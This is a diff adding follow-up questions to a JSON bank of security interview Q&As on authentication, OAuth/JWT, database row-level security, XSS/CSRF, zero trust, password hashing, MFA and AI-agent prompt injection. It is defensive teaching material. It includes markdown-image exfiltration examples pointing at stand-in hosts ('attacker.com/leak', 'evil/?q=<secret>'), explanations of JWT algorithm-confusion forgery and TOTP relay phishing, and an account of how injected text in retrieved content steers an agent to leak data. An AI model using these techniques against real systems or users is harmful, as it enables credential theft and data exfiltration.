+        "q": "How does a least-privilege DB account limit damage even if an injection slips through?",
+        "a": "If the app connects as a role with only the rights it needs (e.g. `SELECT`/`INSERT` on specific tables, no `DROP`, no `xp_cmdshell`, no access to other schemas), a successful injection can't drop tables, escalate, or read unrelated data. It's defense-in-depth: parameterization prevents the injection, least privilege caps the blast radius if some query path was missed."
+      }
     ]
   },
   {
@@ -300,7 +594,21 @@
     "a": "Separation of duties means no single person can complete a sensitive end-to-end action alone (e.g. the developer who writes a change isn't the sole approver who deploys it to prod), which reduces fraud and mistakes. For emergencies you provide break-glass access: a tightly scoped, heavily audited, time-bound elevation (often requiring MFA and generating immediate alerts) that is used only when normal approval paths are unavailable. The combination keeps day-to-day access minimal while still allowing controlled emergency response.",
     "fs": "Day-to-day least privilege with peer-approved promotions, plus a monitored, time-boxed, MFA-gated break-glass role that pages security the moment it's assumed.",
     "fj": "We give the on-call engineer permanent admin so they can fix anything fast.",
-    "level": "Sr"
+    "level": "Sr",
+    "followups": [
+      {
+        "q": "Break-glass access has to work even when your normal auth is down. How do you design it to be both available and safe?",
+        "a": "It can't depend on the systems it might need to recover (don't gate break-glass solely behind the SSO it may be fixing). You pre-create a sealed, locally-authenticated emergency credential or root path with strong MFA, store it in a vault/safe, and rely on detective controls: every use pages security, is heavily logged, and triggers a mandatory post-use review and rotation."
+      },
+      {
+        "q": "Separation of duties can be defeated by collusion or by one person holding two roles. How do you detect that?",
+        "a": "You enforce it in tooling (the deployer can't be the author, approvals require a different identity) and then audit for toxic combinations: the same person holding both halves, self-approvals, or a small group repeatedly approving each other. Periodic access reviews and SoD-conflict reports catch role accumulation that quietly recreates a single-person path."
+      },
+      {
+        "q": "After break-glass is used, what must happen, and why isn't 'we logged it' enough?",
+        "a": "A used break-glass credential should be treated as spent: rotate it, conduct a timely review of exactly what was done under it, and confirm the emergency justified the elevation. Logging alone is passive; without mandatory rotation and review, a break-glass path becomes a quietly-reused backdoor that normalizes standing admin, which is what you were avoiding."
+      }
+    ]
   },
   {
     "q": "What is the difference between authentication and authorization, and why must you not conflate them?",
@@ -308,7 +616,21 @@
     "fs": "AuthN proves identity, authZ checks permission per action and resource; I enforce both server-side on every request and never assume a logged-in user is allowed.",
     "fj": "If the user logged in successfully, they're authorized to see the data.",
     "level": "Jr",
-    "asked": 14
+    "asked": 14,
+    "followups": [
+      {
+        "q": "Why must authorization be re-checked on every request rather than once at login?",
+        "a": "Permissions change mid-session (a role revoked, a resource reassigned, a token downgraded), and each request may touch a different object the user may or may not own. Checking only at login authorizes the session, not the action, so a user keeps access they should have lost and can reach objects never validated. AuthZ is per-action-per-resource, evaluated fresh each time."
+      },
+      {
+        "q": "Where does authorization belong in a microservices architecture, at the gateway or in each service?",
+        "a": "The gateway can do coarse authN and policy, but fine-grained, object-level authZ must live in the service that owns the data, because only it knows ownership and context. Trusting the gateway alone means any service reachable internally is implicitly authorized, which collapses under zero-trust. You enforce identity end-to-end and re-check authorization at the resource owner."
+      },
+      {
+        "q": "What's a subtle way authentication can succeed but still leak authorization, via error messages?",
+        "a": "Returning '404 not found' vs '403 forbidden' for an object the user can't access leaks existence; '403' confirms the resource exists, which helps enumeration. For sensitive resources you return an identical not-found/denied response regardless, so the authorization decision doesn't become an oracle that reveals which IDs are real."
+      }
+    ]
   },
   {
     "q": "Explain the difference between OAuth 2.0, OIDC, and SAML, and which you'd reach for.",
@@ -316,7 +638,21 @@
     "fs": "OAuth2 = API authorization, OIDC = authentication via an ID token on top of OAuth2, SAML = enterprise XML SSO; for mobile/SPA I use Authorization Code + PKCE.",
     "fj": "OAuth logs the user in, so it's basically a login protocol.",
     "level": "Mid",
-    "asked": 16
+    "asked": 16,
+    "followups": [
+      {
+        "q": "What's the practical difference between an OIDC ID token and an access token, and why must you not use one for the other?",
+        "a": "The ID token is for the client to learn who logged in (claims like `sub`, `aud=client`); the access token is an opaque/scoped credential for calling APIs (`aud=resource`). Sending the ID token to an API, or trusting an access token's identity claims, breaks audience assumptions and is a known vulnerability. Each is validated by its intended audience for its intended purpose."
+      },
+      {
+        "q": "Why does SAML fit poorly for native mobile and SPA clients?",
+        "a": "SAML relies on browser POST/redirect of bulky XML assertions and back-channel patterns built for server-rendered web SSO; native apps have no server session, can't safely hold the assertion, and the redirect ergonomics are awkward. OIDC's JSON/JWT tokens, discovery, and Authorization-Code-with-PKCE were designed for public clients, which is why mobile/SPA use OIDC and SAML stays in enterprise web SSO."
+      },
+      {
+        "q": "OAuth scopes vs OIDC claims, how do they divide responsibility?",
+        "a": "Scopes are coarse authorization grants (`read:orders`) that bound what the access token may do at the API; claims are identity/attribute assertions (`email`, `groups`) the API uses for fine-grained authZ. Scopes gate the API surface, claims drive per-resource decisions. Treating scopes as full authorization is a mistake, the resource server still enforces object-level checks."
+      }
+    ]
   },
   {
     "q": "Why is the Authorization Code flow with PKCE preferred over the Implicit flow for SPAs and mobile apps?",
@@ -336,6 +672,20 @@
           "# send challenge on /authorize,",
           "# send verifier on /token exchange"
         ]
+      }
+    ],
+    "followups": [
+      {
+        "q": "PKCE protects the code exchange. What separate attack does the `state` parameter defend against, and why is it still needed?",
+        "a": "`state` defends against CSRF on the redirect/callback: it binds the authorization request to the user's session so an attacker can't inject their own code into your session (login-CSRF / code-fixation). PKCE protects the code from being redeemed by an interceptor; `state` ensures the code arriving at your callback belongs to this user. They cover different threats, so you use both."
+      },
+      {
+        "q": "Why use the S256 code_challenge method rather than 'plain', and when would plain ever be acceptable?",
+        "a": "With `plain`, the challenge equals the verifier, so anyone who sees the authorize request also has the verifier and PKCE adds nothing. `S256` sends only the SHA-256 hash up front, so an interceptor of the front-channel can't derive the verifier needed at the token endpoint. `plain` is only for constrained clients that genuinely can't compute SHA-256, which is rare today."
+      },
+      {
+        "q": "Even with Authorization Code + PKCE, where do an SPA's tokens end up, and what's the residual XSS risk?",
+        "a": "The SPA still receives tokens in the browser, so XSS that runs in your origin can read them regardless of flow. PKCE only secures the code exchange, not token storage. You mitigate by keeping access tokens in memory (not localStorage), using HttpOnly-cookie-backed sessions or a backend-for-frontend that holds tokens server-side, and a strict CSP, since the flow can't protect tokens once script runs in your page."
       }
     ]
   },
@@ -360,6 +710,20 @@
         ],
         "accent": "fix"
       }
+    ],
+    "followups": [
+      {
+        "q": "Explain the RS256-to-HS256 confusion attack in mechanism, not just name.",
+        "a": "If the verifier picks the algorithm from the token header, an attacker changes `alg` to `HS256` and signs the token using your PUBLIC RSA key as the HMAC secret. Because the public key is, well, public, the attacker can forge a valid HMAC, and a naive library verifies it with that same public key as the symmetric secret. Pinning `algorithms=['RS256']` server-side blocks the downgrade entirely."
+      },
+      {
+        "q": "Stateless JWTs are hard to revoke before expiry. How do you handle logout or a compromised token?",
+        "a": "Short-lived access tokens plus a revocable refresh token is the core pattern: access tokens expire in minutes so the revocation window is small, and you revoke the long-lived refresh token (or rotate it with reuse-detection) to cut off renewal. For immediate kill you add a denylist/`jti` check or a token-version claim compared against the user record, accepting a small stateful lookup."
+      },
+      {
+        "q": "Why validate `aud` specifically, and what goes wrong if you skip it?",
+        "a": "`aud` asserts which service the token was minted for; skipping it lets a token issued for service A be replayed against service B by the same IdP, a confused-deputy/token-passing attack. Each resource server must verify it is the intended audience, so a token scoped to the analytics API can't be reused to hit the admin API even though both trust the same issuer."
+      }
     ]
   },
   {
@@ -368,7 +732,21 @@
     "fs": "RBAC keys off roles and is easy to audit; ABAC evaluates subject/resource/environment attributes and shines for region, tenancy, and classification rules where roles would explode.",
     "fj": "ABAC is just RBAC with more roles.",
     "level": "Mid",
-    "asked": 12
+    "asked": 12,
+    "followups": [
+      {
+        "q": "ABAC is flexible but harder to audit. Why, and how do you regain auditability?",
+        "a": "With RBAC you can answer 'who can do X' by listing role members; with ABAC, access is computed from attributes at request time, so the effective answer depends on data state and is not a static list. You regain auditability with policy-as-code, automated policy tests, and 'who-can-access' analysis tooling that evaluates the policy against the current attribute population to enumerate effective access."
+      },
+      {
+        "q": "What is 'role explosion' concretely, and how does it manifest before teams switch to ABAC?",
+        "a": "When access depends on combinations (region × department × data-class × project), RBAC needs a distinct role per combination, so you get `analyst-eu-finance-pii`, `analyst-us-finance-pii`, and hundreds more, which nobody can maintain or audit. The smell is roles multiplying combinatorially and people over-granting because the precise role doesn't exist; that's the signal an attribute on the resource should drive the rule."
+      },
+      {
+        "q": "Most mature systems combine RBAC and ABAC. What's a clean division of labor between them?",
+        "a": "Use RBAC for coarse capability ('can this principal use the warehouse / call this API') because it's simple and auditable, and ABAC for the fine, contextual constraint ('and only rows where `region` matches the subject's region and `classification <= clearance`'). Roles gate the door; attributes filter the contents. This keeps the role count small while expressing data-scoped rules declaratively."
+      }
+    ]
   },
   {
     "q": "How do row-level and column-level security work, and why enforce them in the database rather than the application?",
@@ -389,6 +767,20 @@
           "    current_setting('app.tenant'));"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "Postgres RLS reads `current_setting('app.tenant')`. What's the security risk in how the app sets that, and how do you harden it?",
+        "a": "If the app sets the tenant via a normal `SET` that the connecting role can also change arbitrarily, a SQL-injection or rogue query can spoof another tenant. You harden it by setting it as a non-overridable session var via a trusted path (e.g. `SET LOCAL` inside a transaction the pooler controls), using a role that can't `BYPASSRLS`, and never letting user input reach the tenant setter."
+      },
+      {
+        "q": "Connection pooling can break RLS that relies on per-user session context. Why, and what's the fix?",
+        "a": "A shared pooled connection may carry one user's `SET`-based context into another user's query if the variable isn't reset, leaking cross-tenant data. The fix is transaction-scoped context (`SET LOCAL`) that resets at commit, or pooling in transaction/statement mode with per-transaction tenant binding, so the security predicate can never outlive the request that set it."
+      },
+      {
+        "q": "Table owners and superusers can bypass RLS. How do you keep your enforcement chokepoint actually unbypassable?",
+        "a": "By default the table owner and roles with `BYPASSRLS` ignore policies, so you run the app under a dedicated non-owner, non-bypass role, optionally `FORCE ROW LEVEL SECURITY` so even the owner is filtered, and restrict superuser access to break-glass. Otherwise the 'database chokepoint' has a quiet bypass for exactly the powerful accounts most likely to be misused."
+      }
     ]
   },
   {
@@ -397,7 +789,21 @@
     "fs": "I rely on auto-escaping templates and context-aware encoding, add a strict CSP, and avoid innerHTML; sanitization with a vetted library is the last resort for user-supplied HTML.",
     "fj": "I strip <script> tags from the input and it's safe.",
     "level": "Mid",
-    "asked": 12
+    "asked": 12,
+    "followups": [
+      {
+        "q": "Why is 'strip <script> tags' a doomed approach to XSS?",
+        "a": "Script execution has dozens of vectors beyond `<script>`: `onerror`/`onload` event handlers, `javascript:` URLs, `<svg>`/`<img>` with handlers, and HTML-entity or encoding tricks that re-form a payload after your filter runs. Denylisting one tag misses the rest, and attackers iterate faster than your blocklist. Context-aware output ENCODING (escape on output) is structurally complete where stripping is whack-a-mole."
+      },
+      {
+        "q": "Why is output encoding 'context-aware', and what breaks if you encode for the wrong context?",
+        "a": "The same value needs different escaping in HTML body, an HTML attribute, a URL, JavaScript, and CSS; HTML-escaping a value placed inside a `javascript:` URL or a `<script>` block doesn't neutralize it. Encoding for the wrong context leaves an exploitable gap, which is why frameworks track sink context, and why injecting into JS/URL/CSS contexts is especially dangerous."
+      },
+      {
+        "q": "How does a strict CSP act as a backstop when output encoding fails, and what's its main limitation?",
+        "a": "A CSP with no `unsafe-inline` and a nonce/hash allow-list means even an injected `<script>` won't execute because it lacks the nonce, turning many XSS bugs into non-events. Its limits: it's a second line (not a substitute for encoding), it's easy to weaken with `unsafe-inline`/wildcards, and DOM-based sink abuse plus dangling-markup exfiltration can still bite, so you combine CSP with encoding and Trusted Types."
+      }
+    ]
   },
   {
     "q": "What is CSRF, how does it differ from XSS, and how do you prevent it?",
@@ -405,7 +811,21 @@
     "fs": "CSRF abuses auto-sent cookies to forge state changes; I defend with SameSite cookies plus anti-CSRF tokens, and bearer-token APIs are mostly immune since the header isn't auto-attached.",
     "fj": "CSRF and XSS are the same browser attack with different names.",
     "level": "Mid",
-    "asked": 11
+    "asked": 11,
+    "followups": [
+      {
+        "q": "SameSite=Lax is now a browser default. Why isn't it a complete CSRF defense on its own?",
+        "a": "Lax still allows cookies on top-level GET navigations, so any state-changing GET is exposed, and it doesn't protect against same-site subdomain attacks or older browsers. It also can be too strict for legitimate cross-site flows, leading teams to loosen it. So you keep state changes on POST/PUT/DELETE, add anti-CSRF tokens, and treat SameSite as one layer, not the whole defense."
+      },
+      {
+        "q": "Why does XSS defeat anti-CSRF tokens entirely?",
+        "a": "Anti-CSRF tokens assume the attacker can't read your page; XSS runs in your origin and can read the token straight out of the DOM/cookie and then forge a perfectly valid same-origin request. So XSS is strictly more powerful, an XSS bug nullifies CSRF protections, which is why XSS is the higher-priority fix and CSRF tokens are not a substitute for output encoding/CSP."
+      },
+      {
+        "q": "How does the double-submit cookie pattern work, and what's its weakness versus the synchronizer token?",
+        "a": "Double-submit sends the CSRF token both as a cookie and as a header/form field; the server just checks they match, needing no server-side state. Its weakness: if an attacker can set or overwrite cookies (e.g. via a subdomain or MITM on a non-HTTPS path), they can make both halves match. The synchronizer (server-stored) token avoids that but requires session state, so you pick based on your trust in cookie integrity."
+      }
+    ]
   },
   {
     "q": "What is the zero-trust security model and how does it differ from the perimeter model?",
@@ -413,7 +833,21 @@
     "fs": "Zero trust removes implicit network trust: every request is authenticated and authorized by identity/device, not by being 'inside', so a breached host can't roam laterally.",
     "fj": "Once a service is inside the VPC it's trusted, that's what the private network is for.",
     "level": "Sr",
-    "asked": 13
+    "asked": 13,
+    "followups": [
+      {
+        "q": "Zero trust says don't trust the network, yet you still use private subnets and VPC isolation. Why keep both?",
+        "a": "Identity-based verification is the primary control, but network isolation is defense-in-depth: it shrinks the attack surface and contains blast radius if an identity control fails. Zero trust replaces network as the SOLE trust boundary, not as a layer. You keep private subnets and microsegmentation so a compromised identity also has to defeat network limits, rather than choosing one or the other."
+      },
+      {
+        "q": "Device posture is part of zero trust. What does it add beyond authenticating the user/service?",
+        "a": "It conditions access on the health of the requesting device or workload (patched, encrypted disk, managed, expected image), so a valid credential from a compromised or unmanaged endpoint can still be denied. This stops stolen-credential and compromised-host attacks that pure identity checks miss, and it's why BeyondCorp-style access ties each request to both identity AND device/workload attestation."
+      },
+      {
+        "q": "What's the hardest practical part of rolling out zero trust to an existing data platform?",
+        "a": "Retrofitting per-request identity onto legacy services that assumed network trust: adding mTLS/short-lived tokens, instrumenting authorization on every call, and building the identity, policy, and cert-rotation plumbing without breaking working systems. The phased path is to inventory flows, introduce a service mesh/identity layer, then progressively remove implicit-trust allow-rules, because a big-bang cutover tends to cause outages."
+      }
+    ]
   },
   {
     "q": "What is mTLS and when do you require it over ordinary one-way TLS?",
@@ -421,7 +855,21 @@
     "fs": "mTLS makes both client and server present certificates, giving cryptographic service identity for zero-trust meshes and M2M; a mesh or private CA automates short-lived cert rotation.",
     "fj": "TLS already encrypts the traffic, so mTLS is just redundant overhead.",
     "level": "Sr",
-    "asked": 9
+    "asked": 9,
+    "followups": [
+      {
+        "q": "Certificate revocation is notoriously unreliable (CRL/OCSP). How do meshes sidestep it for mTLS?",
+        "a": "Rather than rely on checking revocation lists, meshes issue very short-lived certificates (minutes to hours) and rotate continuously, so a compromised cert expires almost immediately and 'revocation' becomes 'don't renew'. This converts a hard distributed-revocation problem into a cheap automated reissuance problem, which is why SPIFFE/mesh identities favor short TTLs over CRL/OCSP."
+      },
+      {
+        "q": "Why is mTLS not a substitute for application-layer authorization?",
+        "a": "mTLS authenticates which service is calling (identity), but it doesn't decide whether that service may perform this specific action on this resource. A valid client cert just proves 'I am service B'; you still need authZ to enforce 'service B may only read these rows'. Treating a successful mTLS handshake as permission recreates the 'authenticated therefore authorized' bug at the service layer."
+      },
+      {
+        "q": "What's the operational risk of automated short-lived cert rotation, and how do you guard against it?",
+        "a": "If the CA/issuance path fails or clocks skew, every service can lose the ability to renew and the whole mesh stops talking, an outage worse than a slow cert. You guard with CA high-availability, monitoring of issuance and expiry, modest TTLs with renewal well before expiry, and alarms on rotation failures, so 'short-lived' doesn't turn a CA blip into a mesh-wide outage."
+      }
+    ]
   },
   {
     "q": "What does STRIDE give you in threat modeling, and how do you use it on a data pipeline?",
@@ -429,7 +877,21 @@
     "fs": "STRIDE = Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege; I walk a data-flow diagram's trust boundaries and map each threat to a concrete control.",
     "fj": "Threat modeling is just running a vulnerability scanner before release.",
     "level": "Sr",
-    "asked": 10
+    "asked": 10,
+    "followups": [
+      {
+        "q": "Why are trust boundaries, not individual components, where STRIDE analysis pays off most?",
+        "a": "Threats concentrate where data crosses from a less-trusted zone to a more-trusted one (internet→ingest, account A→account B, app→DB), because that's where spoofing, tampering, and elevation actually occur. Analyzing each component in isolation misses the interactions; focusing on boundary crossings tells you exactly where to require authN, integrity checks, and authorization, which is the highest-yield use of the data-flow diagram."
+      },
+      {
+        "q": "Repudiation is the threat people skip. What does mitigating it look like on a data pipeline, concretely?",
+        "a": "Repudiation is a party denying they performed an action; the mitigation is non-repudiable, tamper-resistant audit logging of who triggered each ingest, transform, or grant, with strong identity (not shared service accounts) so actions attribute to a person/principal. Signed artifacts and provenance extend this to 'this data came from this run', so you can prove rather than argue what happened."
+      },
+      {
+        "q": "Why is 'we run a scanner before release' a fundamentally different (and insufficient) thing than threat modeling?",
+        "a": "A scanner finds known implementation vulnerabilities in code you already wrote; threat modeling is a design-time activity that finds architectural flaws (a missing trust boundary, an over-trusted internal hop, an exfiltration path) that no scanner detects. Done early, it changes the design cheaply; scanning is a useful complement for known-CVE coverage but can't catch a logic or trust-boundary mistake."
+      }
+    ]
   },
   {
     "q": "What is the 'lethal trifecta' for AI agents, and how do you break it?",
@@ -437,7 +899,21 @@
     "fs": "The lethal trifecta is private data + untrusted content + exfiltration in one agent; I break it by removing a leg (no outbound channel, sandboxed untrusted input, or human-in-the-loop) rather than trusting a filter.",
     "fj": "We add a system prompt telling the model to ignore injected instructions, so it's safe.",
     "level": "Sr",
-    "asked": 18
+    "asked": 18,
+    "followups": [
+      {
+        "q": "Why is 'remove a leg' more robust than 'detect the injection', given how good models are getting?",
+        "a": "Injection detection is an open adversarial problem: any classifier has a bypass, and an attacker only needs one success while you need every block. Removing a leg (no private data in that context, or no outbound channel) makes exploitation impossible regardless of how clever the prompt is, turning a probabilistic defense into a structural one. You don't bet security on winning an arms race against natural-language attacks."
+      },
+      {
+        "q": "Exfiltration channels are sneakier than 'send an email'. Name some non-obvious ones an agent might have.",
+        "a": "A rendered markdown image (`![](attacker.com/leak?data=...)`) leaks via the fetch; clickable links the user follows; tool calls to web search, webhooks, or a 'save to shared doc'; even DNS lookups or error-reporting endpoints. Any path that reaches an attacker-observable destination counts. That's why closing the exfil leg means auditing every output sink, not just obvious 'send' tools."
+      },
+      {
+        "q": "If you must keep all three legs, how do you make human-in-the-loop approval actually effective rather than rubber-stamping?",
+        "a": "Approval works only if the human sees the concrete, fully-resolved action (the exact recipient, the exact data) before it executes, and if high-impact actions can't be batched into fatigue-inducing streams. You scope approvals to genuinely sensitive operations, show the rendered effect (not a vague 'run tool?'), and design so the default is deny, otherwise users click 'allow' reflexively and the gate is theater."
+      }
+    ]
   },
   {
     "q": "What is indirect prompt injection, and how does it threaten a RAG or tool-using system?",
@@ -445,7 +921,21 @@
     "fs": "Indirect injection hides instructions in retrieved/ingested content; since the model can't separate data from instructions, I treat all retrieved text as untrusted and constrain tools and output channels.",
     "fj": "Only the user can prompt-inject, so validating the user's message is enough.",
     "level": "Sr",
-    "asked": 14
+    "asked": 14,
+    "followups": [
+      {
+        "q": "Why can't the model just be told 'the retrieved text is data, not instructions' and follow that reliably?",
+        "a": "LLMs process the entire context as one token stream with no hard, enforced boundary between trusted instructions and untrusted data, unlike a database that separates SQL from bind parameters. Sufficiently persuasive injected text can override a system instruction, and there's no parse-time guarantee it won't. So the separation has to be architectural (limit what the model CAN do), not a polite instruction it may or may not honor."
+      },
+      {
+        "q": "How does a poisoned document end up in a RAG index in the first place, and what does that imply for defense?",
+        "a": "Any ingestion path the attacker can influence (a public web crawl, a user-uploaded file, a shared wiki, an inbound email indexed for search) can carry the payload, so the trust boundary is at ingestion, not just retrieval. That implies provenance tracking and treating low-trust sources differently (separate indexes, reduced tool access when their chunks are in context) rather than assuming everything in the index is safe."
+      },
+      {
+        "q": "Output-side defenses matter too. How does an injected instruction exfiltrate data through 'just rendering' a response?",
+        "a": "The model can be steered to emit a markdown image or link whose URL embeds stolen context (`![x](https://evil/?q=<secret>)`); when the UI auto-renders it, the browser fetches the URL and leaks the data, no tool call needed. Defenses: don't auto-render untrusted-derived markdown images, allow-list outbound domains, and escape/strip links in model output, closing the silent exfil sink."
+      }
+    ]
   },
   {
     "q": "How do you classify data, and why is classification the foundation of every other control?",
@@ -453,7 +943,21 @@
     "fs": "I tag data by sensitivity in the catalog and write tag-based policies, so masking, retention, and access controls follow the data instead of being hand-applied per column.",
     "fj": "Classification is paperwork; the real security is encryption.",
     "level": "Jr",
-    "asked": 9
+    "asked": 9,
+    "followups": [
+      {
+        "q": "Tags should propagate as data flows through transforms. What goes wrong when classification doesn't follow a derived column?",
+        "a": "If a downstream table built from a PII column loses the tag (a join, a concat, an aggregate that's still identifying), the derivative escapes masking/retention controls even though it's just as sensitive. You need lineage-aware tag propagation so derived columns inherit the strictest source classification by default; otherwise classification protects the source and silently leaks the copy."
+      },
+      {
+        "q": "Automated classification has false positives and false negatives. How do you tune which error to prefer?",
+        "a": "For security, you bias toward false positives: over-classifying a benign column is a minor friction, but a false negative leaves real PII unprotected. So you set discovery to flag aggressively, route ambiguous columns to a human steward, and treat unclassified-but-suspected data as restricted until reviewed, accepting some over-tagging to avoid silent exposure."
+      },
+      {
+        "q": "Why is policy-by-tag operationally superior to policy-by-column-name at scale?",
+        "a": "Column-name policies break the moment a column is renamed, a new PII column is added, or schemas multiply across hundreds of tables; you'd hand-maintain thousands of rules. Tag-based policies mean one rule ('mask anything tagged PII for non-PII roles') covers every current and future tagged column automatically, so protection scales with the catalog instead of with manual per-column effort."
+      }
+    ]
   },
   {
     "q": "What is data residency, and how do GDPR and CCPA shape where and how long you keep data?",
@@ -461,7 +965,21 @@
     "fs": "Residency pins PII to a jurisdiction; GDPR/CCPA force deletion, minimization, and transfer limits, so I region-pin storage/compute and build deletion pipelines that reach every copy including backups.",
     "fj": "We store everything in us-east-1 and add a privacy policy page, that covers GDPR.",
     "level": "Mid",
-    "asked": 11
+    "asked": 11,
+    "followups": [
+      {
+        "q": "GDPR's right to erasure collides with immutable backups and WORM audit logs. How do you reconcile that?",
+        "a": "You can't selectively delete from an immutable snapshot, so the accepted pattern is crypto-shredding: encrypt each subject's data with a per-subject (or per-tenant) key and, on an erasure request, destroy that key so the backup ciphertext becomes permanently unreadable. For logs you store pseudonymous IDs and delete the separate ID-to-PII mapping, satisfying erasure without rewriting immutable stores."
+      },
+      {
+        "q": "Why is data minimization a security control and not just a compliance checkbox?",
+        "a": "Every field you don't collect or retain is data that can't be breached, mis-shared, or subpoenaed; minimization shrinks the attack surface and the blast radius directly. The 'keep everything forever just in case' posture maximizes liability and breach impact. So minimization and tight retention are defensive, fewer copies and shorter lifetimes mean less to protect and less to lose."
+      },
+      {
+        "q": "Cross-border transfer restrictions are easy to violate accidentally. Where does silent replication leak EU data out of region?",
+        "a": "Through cross-region database replicas, multi-region object replication, global CDNs/caches, log and telemetry pipelines that ship to a central (often US) region, and managed services that process in another region. The fix is an explicit data map plus controls (region-pinned services, replication and endpoint restrictions, transfer mechanisms like SCCs) and auditing telemetry/log destinations, which are the most-overlooked exfil-of-region paths."
+      }
+    ]
   },
   {
     "q": "Why do you hash passwords with bcrypt/Argon2 instead of SHA-256, and what is salting?",
@@ -483,6 +1001,20 @@
         ],
         "accent": "fix"
       }
+    ],
+    "followups": [
+      {
+        "q": "Salting defeats rainbow tables, but what additional attack do salts NOT stop, and what does?",
+        "a": "Salts don't stop targeted brute-force/dictionary attacks against a single hash, because the attacker just includes the (stored) salt in their guesses. What stops that is the work factor: making each guess slow/memory-hard so even one password takes infeasibly long to crack. Salt kills precomputation and cross-account reuse; the cost factor kills per-hash brute force. You need both."
+      },
+      {
+        "q": "Why is Argon2 'memory-hard', and why does that specifically matter versus bcrypt's pure time cost?",
+        "a": "Argon2 forces each guess to use a large amount of RAM, which defeats GPUs and ASICs that can parallelize cheap-memory time-only hashes by the thousands. bcrypt is slow but low-memory, so specialized hardware still parallelizes it well. Memory-hardness raises the attacker's hardware cost per guess, which is why Argon2id (tuned memory/time/parallelism) is the modern recommendation for high-value secrets."
+      },
+      {
+        "q": "Work factors that were safe years ago become weak as hardware improves. How do you keep hashes current without all users resetting?",
+        "a": "You store the algorithm and parameters with each hash, and on successful login check whether the stored cost is below your current target; if so, re-hash the just-verified plaintext at the new factor and update the record. This transparently upgrades active users over time. For a parameter you can't compute without the password, login is the only moment you can re-hash."
+      }
     ]
   },
   {
@@ -491,7 +1023,21 @@
     "fs": "MFA combines independent factors; I prefer FIDO2/WebAuthn passkeys because they're origin-bound and phishing-resistant, unlike SMS (SIM-swap) or TOTP (relay/fatigue).",
     "fj": "We text a 6-digit code, so the account is protected by MFA.",
     "level": "Jr",
-    "asked": 12
+    "asked": 12,
+    "followups": [
+      {
+        "q": "What exactly makes WebAuthn 'origin-bound', and how does that defeat a real-time phishing proxy?",
+        "a": "The authenticator signs a challenge that includes the actual origin (RP ID) the browser is talking to, and the browser supplies that origin, not the user. An attacker's proxy site has a different origin, so the signature it relays won't match the real site's expected RP ID and verification fails. TOTP/push have no such binding, so a proxy that forwards the code in real time succeeds; WebAuthn structurally can't be relayed."
+      },
+      {
+        "q": "TOTP is better than SMS but still phishable. Walk through how a TOTP code gets stolen in practice.",
+        "a": "A reverse-proxy phishing kit (Evilginx-style) shows the user a pixel-perfect fake login, relays their password and the freshly-entered TOTP code to the real site within the ~30s window, and captures the resulting session cookie. The code is valid because there's no origin binding, so the user's correct code authenticates the attacker's session. Push 'approve?' prompts fall similarly, or to fatigue-bombing."
+      },
+      {
+        "q": "If you require phishing-resistant MFA, how do you handle account recovery without reopening the phishable hole?",
+        "a": "Recovery is the soft underbelly: SMS or email reset flows reintroduce exactly the weak factor you removed. You register multiple WebAuthn authenticators (a backup key/passkey) so loss of one isn't lockout, use one-time recovery codes stored offline, and for high-assurance accounts route recovery through an identity-verified, audited help-desk path rather than a self-service SMS reset."
+      }
+    ]
   },
   {
     "q": "Explain defense in depth, and give a concrete example layering controls around a data warehouse.",
@@ -499,6 +1045,20 @@
     "fs": "I stack independent controls — network isolation, MFA'd SSO, least-privilege RBAC plus RLS/masking, KMS encryption, and immutable audit logs — so defeating one layer still doesn't expose the data.",
     "fj": "We encrypt the database, so the data is secure.",
     "level": "Sr",
-    "asked": 10
+    "asked": 10,
+    "followups": [
+      {
+        "q": "The key word is 'independent' controls. Why does that matter, and what's an example of layers that only look independent?",
+        "a": "Layers only add up if a single failure can't defeat several at once; correlated controls give false depth. Example: network isolation and authZ that both depend on the same SSO/identity provider, so an IdP compromise drops both. Or encryption and access using the same over-broad admin role. True depth means each layer fails to a different cause, so one breach doesn't cascade."
+      },
+      {
+        "q": "Defense in depth is mostly preventive. Where does detection fit, and why is it not optional?",
+        "a": "Preventive layers buy time but a determined attacker eventually peels them; without detection you never know it happened until the breach is public. Tamper-resistant audit logging plus alerting on anomalies (unusual query volume, off-hours access, new principals) turns 'a layer failed silently' into 'we caught and responded'. Detection is the layer that assumes prevention failed, which is the whole premise."
+      },
+      {
+        "q": "More layers add cost and friction. How do you decide you have 'enough' depth rather than infinite controls?",
+        "a": "You anchor on the threat model and data sensitivity: enumerate the realistic attack paths to the crown-jewel data and ensure each path crosses multiple independent controls, then stop. Controls that don't block a modeled path, or that duplicate an existing layer's failure mode, add friction without reducing risk. Depth is sized to the value protected and the threats faced, not maximized blindly."
+      }
+    ]
   }
 ]
